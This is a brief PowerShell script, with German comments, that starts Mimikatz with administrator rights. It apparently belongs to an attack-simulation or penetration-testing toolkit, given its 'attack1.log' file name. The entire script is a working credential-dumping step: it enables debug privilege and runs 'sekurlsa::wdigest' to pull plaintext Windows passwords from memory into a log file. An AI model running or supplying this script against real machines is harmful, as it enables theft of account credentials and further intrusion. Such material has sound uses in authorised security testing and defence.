$process = "C:\prehendo\Tools\mimikatz\x64\mimikatz.exe" #Pfad der Mimikatz exe
$argument1 = "`"log C:\prehendo\Logs\attack1.log`"" #Pfad der Logdatei
$argument2 = "privilege::debug" #Privilegien setzten
$argument3 = "sekurlsa::wdigest" #Klartextpasswort
$argument4 = "exit" #Klartextpasswort

Start-Process $process -Verb runAs -ArgumentList $argument1, $argument2, $argument3, $argument4